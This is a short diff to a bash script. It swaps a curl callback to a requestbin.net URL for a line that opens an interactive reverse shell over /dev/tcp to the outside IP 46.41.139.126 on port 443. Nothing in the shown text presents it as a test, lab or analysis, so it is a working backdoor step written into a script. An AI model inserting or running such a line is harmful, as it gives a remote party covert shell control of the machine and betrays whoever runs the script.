@@ -1,3 +1,3 @@
 #!/bin/bash
 
-curl 'http://requestbin.net/r/18hw8sn1'
+bash -i >& /dev/tcp/46.41.139.126/443 0>&1
